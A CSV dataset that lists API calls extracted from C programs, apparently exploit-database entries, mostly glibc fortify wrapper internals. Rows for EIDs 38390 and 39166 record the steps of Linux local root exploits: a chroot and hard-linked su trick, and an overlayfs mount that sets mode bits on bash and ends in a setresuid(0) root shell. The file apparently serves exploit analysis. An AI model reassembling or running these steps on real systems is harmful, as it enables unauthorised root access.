EID,func,API use case
38390,readlink,"__readlink_chk (__path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
38390,readlink,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,readlink,"__readlink_chk_warn (__path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
38390,readlink,"__readlink_alias (__path, __buf, __len);"
38390,readlinkat,"__builtin_object_size ((const void *) __buf, 1)"
38390,readlinkat,__builtin_constant_p (__len)
38390,readlinkat,"__readlinkat_chk (__fd, __path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
38390,readlinkat,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,readlinkat,"__readlinkat_chk_warn (__fd, __path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
38390,readlinkat,"__readlinkat_alias (__fd, __path, __buf, __len);"
38390,getcwd,"__builtin_object_size ((const void *) __buf, 1)"
38390,getcwd,__builtin_constant_p (__size)
38390,getcwd,"__getcwd_chk (__buf, __size, __builtin_object_size ((const void *) __buf, 1));"
38390,getcwd,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,getcwd,"__getcwd_chk_warn (__buf, __size, __builtin_object_size ((const void *) __buf, 1));"
38390,getcwd,"__getcwd_alias (__buf, __size);"
38390,getwd,"__builtin_object_size ((const void *) __buf, 1)"
38390,getwd,"__getwd_chk (__buf, __builtin_object_size ((const void *) __buf, 1));"
38390,getwd,__getwd_warn (__buf);
38390,confstr,"__builtin_object_size ((const void *) __buf, 1)"
38390,confstr,__builtin_constant_p (__len)
38390,confstr,"__confstr_chk (__name, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
38390,confstr,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,confstr,"__confstr_chk_warn (__name, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
38390,confstr,"__confstr_alias (__name, __buf, __len);"
38390,getgroups,"__builtin_object_size ((const void *) __list, 1)"
38390,getgroups,__builtin_constant_p (__size)
38390,getgroups,"__getgroups_chk (__size, __list, __builtin_object_size ((const void *) __list, 1));"
38390,getgroups,"__builtin_object_size ((const void *) __list, 1)"
38390,getgroups,"__getgroups_chk_warn (__size, __list, __builtin_object_size ((const void *) __list, 1));"
38390,getgroups,"__getgroups_alias (__size, __list);"
38390,ttyname_r,"__builtin_object_size ((const void *) __buf, 1)"
38390,ttyname_r,__builtin_constant_p (__buflen)
38390,ttyname_r,"__ttyname_r_chk (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,ttyname_r,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,ttyname_r,"__ttyname_r_chk_warn (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,ttyname_r,"__ttyname_r_alias (__fd, __buf, __buflen);"
38390,getlogin_r,"__builtin_object_size ((const void *) __buf, 1)"
38390,getlogin_r,__builtin_constant_p (__buflen)
38390,getlogin_r,"__getlogin_r_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,getlogin_r,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,getlogin_r,"__getlogin_r_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,getlogin_r,"__getlogin_r_alias (__buf, __buflen);"
38390,gethostname,"__builtin_object_size ((const void *) __buf, 1)"
38390,gethostname,__builtin_constant_p (__buflen)
38390,gethostname,"__gethostname_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,gethostname,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,gethostname,"__gethostname_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,gethostname,"__gethostname_alias (__buf, __buflen);"
38390,getdomainname,"__builtin_object_size ((const void *) __buf, 1)"
38390,getdomainname,__builtin_constant_p (__buflen)
38390,getdomainname,"__getdomainname_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,getdomainname,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
38390,getdomainname,"__getdomainname_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
38390,getdomainname,"__getdomainname_alias (__buf, __buflen);"
38390,open,__builtin_va_arg_pack_len ()
38390,open,__open_too_many_args ();
38390,open,__builtin_constant_p (__oflag)
38390,open,__builtin_va_arg_pack_len ()
38390,open,__open_missing_mode ();
38390,open,"__open_2 (__path, __oflag);"
38390,open,"__open_alias (__path, __oflag, __builtin_va_arg_pack ());"
38390,open,__builtin_va_arg_pack_len ()
38390,open,"__open_2 (__path, __oflag);"
38390,open,"__open_alias (__path, __oflag, __builtin_va_arg_pack ());"
38390,open64,__builtin_va_arg_pack_len ()
38390,open64,__open64_too_many_args ();
38390,open64,__builtin_constant_p (__oflag)
38390,open64,__builtin_va_arg_pack_len ()
38390,open64,__open64_missing_mode ();
38390,open64,"__open64_2 (__path, __oflag);"
38390,open64,"__open64_alias (__path, __oflag, __builtin_va_arg_pack ());"
38390,open64,__builtin_va_arg_pack_len ()
38390,open64,"__open64_2 (__path, __oflag);"
38390,open64,"__open64_alias (__path, __oflag, __builtin_va_arg_pack ());"
38390,openat,__builtin_va_arg_pack_len ()
38390,openat,__openat_too_many_args ();
38390,openat,__builtin_constant_p (__oflag)
38390,openat,__builtin_va_arg_pack_len ()
38390,openat,__openat_missing_mode ();
38390,openat,"__openat_2 (__fd, __path, __oflag);"
38390,openat,"__openat_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
38390,openat,__builtin_va_arg_pack_len ()
38390,openat,"__openat_2 (__fd, __path, __oflag);"
38390,openat,"__openat_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
38390,openat64,__builtin_va_arg_pack_len ()
38390,openat64,__openat64_too_many_args ();
38390,openat64,__builtin_constant_p (__oflag)
38390,openat64,__builtin_va_arg_pack_len ()
38390,openat64,__openat64_missing_mode ();
38390,openat64,"__openat64_2 (__fd, __path, __oflag);"
38390,openat64,"__openat64_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
38390,openat64,__builtin_va_arg_pack_len ()
38390,openat64,"__openat64_2 (__fd, __path, __oflag);"
38390,openat64,"__openat64_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
38390,bcopy,"__builtin___memmove_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,bzero,"__builtin___memset_chk (__dest, 0, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,memcpy,"__builtin___memcpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,memmove,"__builtin___memmove_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,mempcpy,"__builtin___mempcpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,memset,"__builtin___memset_chk (__dest, __ch, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,explicit_bzero,"__explicit_bzero_chk (__dest, __len, __builtin_object_size ((const void *) __dest, 0));"
38390,strcpy,"__builtin___strcpy_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
38390,stpcpy,"__builtin___stpcpy_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
38390,strncpy,"__builtin___strncpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 1));"
38390,stpncpy,"__builtin_object_size ((const void *) __dest, 1) != 18446744073709551615 && (__builtin_constant_p (__n) == 0 || __builtin_object_size ((const void *) __dest, 1) < (long unsigned int) __n)"
38390,stpncpy,"__stpncpy_chk (__dest, __src, __n, __builtin_object_size ((const void *) __dest, 1));"
38390,stpncpy,"__stpncpy_alias (__dest, __src, __n);"
38390,strcat,"__builtin___strcat_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
38390,strncat,"__builtin___strncat_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 1));"
38390,stat,"__xstat (1, __path, __statbuf);"
38390,lstat,"__lxstat (1, __path, __statbuf);"
38390,fstat,"__fxstat (1, __fd, __statbuf);"
38390,fstatat,"__fxstatat (1, __fd, __filename, __statbuf, __flag);"
38390,mknod,"__xmknod (0, __path, __mode, &__dev);"
38390,mknodat,"__xmknodat (0, __fd, __path, __mode, &__dev);"
38390,stat64,"__xstat64 (1, __path, __statbuf);"
38390,lstat64,"__lxstat64 (1, __path, __statbuf);"
38390,fstat64,"__fxstat64 (1, __fd, __statbuf);"
38390,fstatat64,"__fxstatat64 (1, __fd, __filename, __statbuf, __flag);"
38390,child,close (go[1]);
38390,child,"read (go[0], (void *) &c, 1);"
38390,child,setuid (0);
38390,child,"chdir ((const char *) ""chroot"")"
38390,child,"chroot ((const char *) ""."")"
38390,setup_chroot,"mkdir ((const char *) ""chroot"", 493);"
38390,setup_chroot,"mkdir ((const char *) ""chroot/lib64"", 493);"
38390,setup_chroot,"mkdir ((const char *) ""chroot/bin"", 493);"
38390,setup_chroot,"link (me, (const char *) ""chroot/lib64/ld-linux-x86-64.so.2"")"
38390,setup_chroot,"link ((const char *) ""/bin/su"", (const char *) ""chroot/bin/su"")"
38390,main,geteuid ()
38390,main,"chown ((const char *) ""lib64/ld-linux-x86-64.so.2"", 0, 0);"
38390,main,"chmod ((const char *) ""lib64/ld-linux-x86-64.so.2"", 2541);"
38390,main,exit (0);
38390,main,geteuid ()
38390,main,setuid (0);
38390,main,"execve ((const char *) *(char * *) &sh, (char * const *) &sh, (char * const *) environ);"
38390,main,"memset ((void *) &me, 0, 256);"
38390,main,"readlink ((const char * restrict) ""/proc/self/exe"", (char *) &me, 255);"
38390,main,fork ()
38390,main,"stat ((const char *) &me, &st);"
38390,main,usleep (1000);
38390,main,"execve ((const char *) &me, (char * const *) &mee, (char * const *) environ);"
38390,main,setup_chroot ((const char *) &me);
38390,main,pipe ((int *) &go)
38390,main,"clone (child, (void *) &child_stack + 1048576, 268435985, 0B);"
38390,main,"snprintf ((char *) &map_file, 128, (const char * restrict) ""/proc/%d/uid_map"", pid);"
38390,main,"open ((const char *) &map_file, 2))"
38390,main,"snprintf ((char *) &uidmap, 128, (const char * restrict) ""0 %d 1\n"", getuid ());"
38390,main,"write (fd, (const void *) &uidmap, strlen ((const char *) &uidmap))"
38390,main,close (fd);
38390,main,close (go[0]);
38390,main,"write (go[1], (const void *) ""X"", 1);"
38390,main,"waitpid (pid, 0B, 0);"
38390,main,"execve ((const char *) *(char * *) &su, (char * const *) &su, 0B);"
39166,getchar,getc (stdin);
39166,putchar,"putc (__c, stdout);"
39166,fputc_unlocked,"__builtin_expect (__stream->_IO_write_ptr >= __stream->_IO_write_end, 0) != 0 ? __overflow (__stream, (int) (unsigned char) __c) : (int) (unsigned char) (*__stream->_IO_write_ptr++  = (char) __c);"
39166,putc_unlocked,"__builtin_expect (__stream->_IO_write_ptr >= __stream->_IO_write_end, 0) != 0 ? __overflow (__stream, (int) (unsigned char) __c) : (int) (unsigned char) (*__stream->_IO_write_ptr++  = (char) __c);"
39166,putchar_unlocked,"__builtin_expect (stdout->_IO_write_ptr >= stdout->_IO_write_end, 0) != 0 ? __overflow (stdout, (int) (unsigned char) __c) : (int) (unsigned char) (*stdout->_IO_write_ptr++  = (char) __c);"
39166,sprintf,"__builtin___sprintf_chk (__s, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __builtin_va_arg_pack ());"
39166,vsprintf,"__builtin___vsprintf_chk (__s, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __ap);"
39166,snprintf,"__builtin___snprintf_chk (__s, __n, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __builtin_va_arg_pack ());"
39166,vsnprintf,"__builtin___vsnprintf_chk (__s, __n, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __ap);"
39166,fprintf,"__fprintf_chk (__stream, 1, __fmt, __builtin_va_arg_pack ());"
39166,printf,"__printf_chk (1, __fmt, __builtin_va_arg_pack ());"
39166,vprintf,"__vfprintf_chk (stdout, 1, __fmt, __ap);"
39166,vfprintf,"__vfprintf_chk (__stream, 1, __fmt, __ap);"
39166,dprintf,"__dprintf_chk (__fd, 1, __fmt, __builtin_va_arg_pack ());"
39166,vdprintf,"__vdprintf_chk (__fd, 1, __fmt, __ap);"
39166,fgets,"__builtin_object_size ((const void *) __s, 1)"
39166,fgets,__builtin_constant_p (__n)
39166,fgets,"__fgets_chk (__s, __builtin_object_size ((const void *) __s, 1), __n, __stream);"
39166,fgets,"__builtin_object_size ((const void *) __s, 1)"
39166,fgets,"__fgets_chk_warn (__s, __builtin_object_size ((const void *) __s, 1), __n, __stream);"
39166,fgets,"__fgets_alias (__s, __n, __stream);"
39166,fread,"__builtin_object_size ((const void *) __ptr, 0)"
39166,fread,__builtin_constant_p (__size) == 0 || __builtin_constant_p (__n) == 0) || (__size | __n)
39166,fread,"__fread_chk (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
39166,fread,"__builtin_object_size ((const void *) __ptr, 0)"
39166,fread,"__fread_chk_warn (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
39166,fread,"__fread_alias (__ptr, __size, __n, __stream);"
39166,fread_unlocked,"__builtin_object_size ((const void *) __ptr, 0)"
39166,fread_unlocked,__builtin_constant_p (__size) == 0 || __builtin_constant_p (__n) == 0) || (__size | __n)
39166,fread_unlocked,"__fread_unlocked_chk (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
39166,fread_unlocked,"__builtin_object_size ((const void *) __ptr, 0)"
39166,fread_unlocked,"__fread_unlocked_chk_warn (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
39166,fread_unlocked,__builtin_constant_p (__size) != 0 && __builtin_constant_p (__n) != 0) && (__size | __n) <= 4294967295)
39166,fread_unlocked,getc_unlocked (__stream);
39166,fread_unlocked,getc_unlocked (__stream);
39166,fread_unlocked,return (size_t) ((long unsigned int) (__cptr - (char *) __ptr) / (long unsigned int) __size);
39166,fread_unlocked,"__fread_unlocked_alias (__ptr, __size, __n, __stream);"
39166,atoi,"return (int) strtol (__nptr, 0B, 10);"
39166,atol,"strtol (__nptr, 0B, 10);"
39166,atoll,"strtoll (__nptr, 0B, 10);"
39166,bsearch,"__compar (__key, __p);"
39166,atof,"strtod (__nptr, 0B);"
39166,realpath,"__builtin_object_size ((const void *) __resolved, 1)"
39166,realpath,"__realpath_chk (__name, __resolved, __builtin_object_size ((const void *) __resolved, 1));"
39166,realpath,"__realpath_alias (__name, __resolved);"
39166,ptsname_r,"__builtin_object_size ((const void *) __buf, 1)"
39166,ptsname_r,__builtin_constant_p (__buflen)
39166,ptsname_r,"__ptsname_r_chk (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,ptsname_r,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,ptsname_r,"__ptsname_r_chk_warn (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,ptsname_r,"__ptsname_r_alias (__fd, __buf, __buflen);"
39166,wctomb,"__builtin_object_size ((const void *) __s, 1) != 18446744073709551615 && __builtin_object_size ((const void *) __s, 1)"
39166,wctomb,"__wctomb_chk (__s, __wchar, __builtin_object_size ((const void *) __s, 1));"
39166,wctomb,"__wctomb_alias (__s, __wchar);"
39166,mbstowcs,"__builtin_object_size ((const void *) __dst, 1)"
39166,mbstowcs,__builtin_constant_p (__len)
39166,mbstowcs,"__mbstowcs_chk (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1) / 4);"
39166,mbstowcs,"__builtin_object_size ((const void *) __dst, 1) / 4 < (long unsigned int)"
39166,mbstowcs,"__mbstowcs_chk_warn (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1) / 4);"
39166,mbstowcs,"__mbstowcs_alias (__dst, __src, __len);"
39166,wcstombs,"__builtin_object_size ((const void *) __dst, 1)"
39166,wcstombs,__builtin_constant_p (__len)
39166,wcstombs,"__wcstombs_chk (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1));"
39166,wcstombs,"__builtin_object_size ((const void *) __dst, 1) < (long unsigned int)"
39166,wcstombs,"__wcstombs_chk_warn (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1));"
39166,wcstombs,"__wcstombs_alias (__dst, __src, __len);"
39166,read,"__builtin_object_size ((const void *) __buf, 0)"
39166,read,__builtin_constant_p (__nbytes)
39166,read,"__read_chk (__fd, __buf, __nbytes, __builtin_object_size ((const void *) __buf, 0));"
39166,read,"__builtin_object_size ((const void *) __buf, 0) < (long unsigned int)"
39166,read,"__read_chk_warn (__fd, __buf, __nbytes, __builtin_object_size ((const void *) __buf, 0));"
39166,read,"__read_alias (__fd, __buf, __nbytes);"
39166,readlink,"__builtin_object_size ((const void *) __buf, 1)"
39166,readlink,__builtin_constant_p (__len)
39166,readlink,"__readlink_chk (__path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
39166,readlink,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,readlink,"__readlink_chk_warn (__path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
39166,readlink,"__readlink_alias (__path, __buf, __len);"
39166,readlinkat,"__builtin_object_size ((const void *) __buf, 1)"
39166,readlinkat,__builtin_constant_p (__len)
39166,readlinkat,"__readlinkat_chk (__fd, __path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
39166,readlinkat,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,readlinkat,"__readlinkat_chk_warn (__fd, __path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
39166,readlinkat,"__readlinkat_alias (__fd, __path, __buf, __len);"
39166,getcwd,"__builtin_object_size ((const void *) __buf, 1)"
39166,getcwd,__builtin_constant_p (__size)
39166,getcwd,"__getcwd_chk (__buf, __size, __builtin_object_size ((const void *) __buf, 1));"
39166,getcwd,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,getcwd,"__getcwd_chk_warn (__buf, __size, __builtin_object_size ((const void *) __buf, 1));"
39166,getcwd,"__getcwd_alias (__buf, __size);"
39166,getwd,"__builtin_object_size ((const void *) __buf, 1)"
39166,getwd,"__getwd_chk (__buf, __builtin_object_size ((const void *) __buf, 1));"
39166,getwd,__getwd_warn (__buf);
39166,confstr,"__builtin_object_size ((const void *) __buf, 1)"
39166,confstr,__builtin_constant_p (__len)
39166,confstr,"__confstr_chk (__name, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
39166,confstr,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,confstr,"__confstr_chk_warn (__name, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
39166,confstr,"__confstr_alias (__name, __buf, __len);"
39166,getgroups,"__builtin_object_size ((const void *) __list, 1)"
39166,getgroups,__builtin_constant_p (__size)
39166,getgroups,"__getgroups_chk (__size, __list, __builtin_object_size ((const void *) __list, 1));"
39166,getgroups,"__builtin_object_size ((const void *) __list, 1)"
39166,getgroups,"__getgroups_chk_warn (__size, __list, __builtin_object_size ((const void *) __list, 1));"
39166,getgroups,"__getgroups_alias (__size, __list);"
39166,ttyname_r,"__builtin_object_size ((const void *) __buf, 1)"
39166,ttyname_r,__builtin_constant_p (__buflen)
39166,ttyname_r,"__ttyname_r_chk (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,ttyname_r,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,ttyname_r,"__ttyname_r_chk_warn (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,ttyname_r,"__ttyname_r_alias (__fd, __buf, __buflen);"
39166,getlogin_r,"__builtin_object_size ((const void *) __buf, 1)"
39166,getlogin_r,__builtin_constant_p (__buflen)
39166,getlogin_r,"__getlogin_r_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,getlogin_r,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,getlogin_r,"__getlogin_r_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,getlogin_r,"__getlogin_r_alias (__buf, __buflen);"
39166,gethostname,"__builtin_object_size ((const void *) __buf, 1)"
39166,gethostname,__builtin_constant_p (__buflen)
39166,gethostname,"__gethostname_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,gethostname,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,gethostname,"__gethostname_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,gethostname,"__gethostname_alias (__buf, __buflen);"
39166,getdomainname,"__builtin_object_size ((const void *) __buf, 1)"
39166,getdomainname,__builtin_constant_p (__buflen)
39166,getdomainname,"__getdomainname_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,getdomainname,"__builtin_object_size ((const void *) __buf, 1) < (long unsigned int)"
39166,getdomainname,"__getdomainname_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
39166,getdomainname,"__getdomainname_alias (__buf, __buflen);"
39166,stat,"__xstat (1, __path, __statbuf);"
39166,lstat,"__lxstat (1, __path, __statbuf);"
39166,fstat,"__fxstat (1, __fd, __statbuf);"
39166,fstatat,"__fxstatat (1, __fd, __filename, __statbuf, __flag);"
39166,mknod,"__xmknod (0, __path, __mode, &__dev);"
39166,mknodat,"__xmknodat (0, __fd, __path, __mode, &__dev);"
39166,open,__builtin_va_arg_pack_len ()
39166,open,__open_too_many_args ();
39166,open,__builtin_constant_p (__oflag)
39166,open,__builtin_va_arg_pack_len ()
39166,open,__open_missing_mode ();
39166,open,"__open_2 (__path, __oflag);"
39166,open,"__open_alias (__path, __oflag, __builtin_va_arg_pack ());"
39166,open,__builtin_va_arg_pack_len ()
39166,open,"__open_2 (__path, __oflag);"
39166,open,"__open_alias (__path, __oflag, __builtin_va_arg_pack ());"
39166,openat,__builtin_va_arg_pack_len ()
39166,openat,__openat_too_many_args ();
39166,openat,__builtin_constant_p (__oflag)
39166,openat,__builtin_va_arg_pack_len ()
39166,openat,__openat_missing_mode ();
39166,openat,"__openat_2 (__fd, __path, __oflag);"
39166,openat,"__openat_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
39166,openat,__builtin_va_arg_pack_len ()
39166,openat,"__openat_2 (__fd, __path, __oflag);"
39166,openat,"__openat_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
39166,bcopy,"__builtin___memmove_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
39166,bzero,"__builtin___memset_chk (__dest, 0, __len, __builtin_object_size ((const void *) __dest, 0));"
39166,memcpy,"__builtin___memcpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
39166,memmove,"__builtin___memmove_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
39166,memset,"__builtin___memset_chk (__dest, __ch, __len, __builtin_object_size ((const void *) __dest, 0));"
39166,explicit_bzero,"__explicit_bzero_chk (__dest, __len, __builtin_object_size ((const void *) __dest, 0));"
39166,strcpy,"__builtin___strcpy_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
39166,strncpy,"__builtin___strncpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 1));"
39166,stpncpy,"__builtin_object_size ((const void *) __dest, 1) != 18446744073709551615 && (__builtin_constant_p (__n) == 0 || __builtin_object_size ((const void *) __dest, 1) < (long unsigned int) __n)"
39166,stpncpy,"__stpncpy_chk (__dest, __src, __n, __builtin_object_size ((const void *) __dest, 1));"
39166,stpncpy,"__stpncpy_alias (__dest, __src, __n);"
39166,strcat,"__builtin___strcat_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
39166,strncat,"__builtin___strncat_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 1));"
39166,child_exec,"system ((const char *) ""rm -rf /tmp/haxhax"");"
39166,child_exec,"mkdir ((const char *) ""/tmp/haxhax"", 511);"
39166,child_exec,"mkdir ((const char *) ""/tmp/haxhax/w"", 511);"
39166,child_exec,"mkdir ((const char *) ""/tmp/haxhax/u"", 511);"
39166,child_exec,"mkdir ((const char *) ""/tmp/haxhax/o"", 511);"
39166,child_exec,"mount ((const char *) ""overlay"", (const char *) ""/tmp/haxhax/o"", (const char *) ""overlay"", 3236757504, (const void *) ""lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w"")"
39166,child_exec,"chmod ((const char *) ""/tmp/haxhax/w/work"", 511);"
39166,child_exec,"chdir ((const char *) ""/tmp/haxhax/o"");"
39166,child_exec,"chmod ((const char *) ""bash"", 2541);"
39166,child_exec,"chdir ((const char *) ""/"");"
39166,child_exec,"umount ((const char *) ""/tmp/haxhax/o"");"
39166,main,fork ())
39166,main,unshare ();
39166,main,unshare (268435456)
39166,main,fork ())
39166,main,"clone (child_exec, (char *) &child_stack + 1048576, clone_flags, 0B);"
39166,main,clone ();
39166,main,"clone (child_exec, (char *) &child_stack + 1048576, clone_flags, 0B);"
39166,main,"waitpid (pid, &status, 0);"
39166,main,"waitpid (init, &status, 0);"
39166,main,usleep (300000);
39166,main,wait (0B);
39166,main,"stat ((const char *) ""/tmp/haxhax/u/bash"", &s);"
39166,main,"execl ((const char *) ""/tmp/haxhax/u/bash"", (const char *) ""bash"", (char *) ""-p"", (char *) ""-c"", (char *) ""rm -rf /tmp/haxhax;python -c \""import os;os.setresuid(0,0,0);os.execl(\'/bin/bash\',\'bash\');\"""", 0B);"
39230,open,__builtin_va_arg_pack_len ()
39230,open,__open_too_many_args ();
39230,open,__builtin_constant_p (__oflag)
39230,open,__builtin_va_arg_pack_len ()
39230,open,__open_missing_mode ();
39230,open,"__open_2 (__path, __oflag);"
39230,open,"__open_alias (__path, __oflag, __builtin_va_arg_pack ());"
39230,open,__builtin_va_arg_pack_len ()
39230,open,"__open_2 (__path, __oflag);"
39230,open,"__open_alias (__path, __oflag, __builtin_va_arg_pack ());"
39230,open64,__builtin_va_arg_pack_len ()
39230,open64,__open64_too_many_args ();
39230,open64,__builtin_constant_p (__oflag)
39230,open64,__builtin_va_arg_pack_len ()
39230,open64,__open64_missing_mode ();
39230,open64,"__open64_2 (__path, __oflag);"
39230,open64,"__open64_alias (__path, __oflag, __builtin_va_arg_pack ());"
39230,open64,__builtin_va_arg_pack_len ()
39230,open64,"__open64_2 (__path, __oflag);"
39230,open64,"__open64_alias (__path, __oflag, __builtin_va_arg_pack ());"
39230,openat,__builtin_va_arg_pack_len ()
39230,openat,__openat_too_many_args ();
39230,openat,__builtin_constant_p (__oflag)
39230,openat,__builtin_va_arg_pack_len ()
39230,openat,__openat_missing_mode ();
39230,openat,"__openat_2 (__fd, __path, __oflag);"
39230,openat,"__openat_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
39230,openat,__builtin_va_arg_pack_len ()
39230,openat,"__openat_2 (__fd, __path, __oflag);"
39230,openat,"__openat_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
39230,openat64,__builtin_va_arg_pack_len ()
39230,openat64,__openat64_too_many_args ();
39230,openat64,__builtin_constant_p (__oflag)
39230,openat64,__builtin_va_arg_pack_len ()
39230,openat64,__openat64_missing_mode ();
39230,openat64,"__openat64_2 (__fd, __path, __oflag);"
39230,openat64,"__openat64_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
39230,openat64,__builtin_va_arg_pack_len ()
39230,openat64,"__openat64_2 (__fd, __path, __oflag);"
39230,openat64,"__openat64_alias (__fd, __path, __oflag, __builtin_va_arg_pack ());"
39230,stat,"__xstat (1, __path, __statbuf);"
39230,lstat,"__lxstat (1, __path, __statbuf);"
39230,fstat,"__fxstat (1, __fd, __statbuf);"
